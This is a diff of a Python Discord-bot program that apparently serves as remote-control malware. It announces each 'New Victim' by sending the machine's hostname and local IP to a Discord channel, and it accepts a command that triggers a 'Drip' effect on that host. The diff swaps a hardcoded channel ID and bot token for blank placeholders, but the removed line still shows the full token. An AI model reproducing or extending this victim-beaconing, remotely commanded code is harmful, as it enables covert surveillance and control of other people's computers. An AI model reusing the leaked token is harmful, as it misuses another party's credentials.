@@ -9,6 +9,9 @@ import tkinter
 from tkinter import *
 from PIL import Image, ImageTk
 
+TOKEN = ""
+CHANNEL = 0
+
 def getResourcePath(relative_path):
     try:
         base_path = sys._MEIPASS
@@ -51,7 +54,7 @@ def start_bot():
         embed = discord.Embed(title="New Victim")
         embed.add_field(name="Hostname:",value=hostname)
         embed.add_field(name="Local IP:",value=local_ip)
-        channel = bot.get_channel(820040602649493524)
+        channel = bot.get_channel(CHANNEL)
         await channel.send(embed=embed)
 
     @bot.command()
@@ -62,6 +65,6 @@ def start_bot():
         win.start()
         await ctx.send(f"Drip activated on: {hostname}")
 
-    bot.run("ODIwMDMxMTcyNDgyMDM5ODkw.YEvPig.yjUcPwpvTQGaXxUnrfxJWuij2DY")
+    bot.run(TOKEN)
 
 start_bot()
